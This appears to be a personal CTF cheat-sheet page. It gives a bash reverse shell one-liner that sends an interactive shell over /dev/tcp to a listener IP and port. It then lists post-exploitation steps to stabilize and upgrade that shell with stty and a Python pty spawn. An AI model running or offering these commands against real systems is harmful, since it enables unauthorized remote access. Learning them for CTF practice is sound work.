# Pretext
Generic [[Termonology#Reverse Shell|Reverse Shell]] commonly seen and used in  [[Termonology#CTF|CTF's]]
# Bash Shell's
```Bash
sh -i >& /dev/tcp/192.168.133.207/4444 0>&1
```
Generic [[Code Languages#Bash|Bash]] [[Termonology#Reverse Shell|Reverse Shell]]. Substitute [[Termonology#IP|IP]] and [[Termonology#Port|Port]] with your own. 
# Upgrade and Stabilize Shell's
## Stabilize Shell
```Bash
cntrl + z
```
To background the process.
```Bash
stty raw -echo && fg
```
To bring the [[Termonology#Shell|Shell]] from the foreground with full permissions.
## Spawn Shell With Python
```Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Upgrade [[Termonology#Shell|Shell]] with Python via the pty library. Can be substituted with [[Code Commands#python|python]] or [[Code Commands#python2|python2]].
## Set Terminal Environment
```Bash
export TERM=xterm
```
Sets the terminal environment to [[Termonology#xterm|xterm]].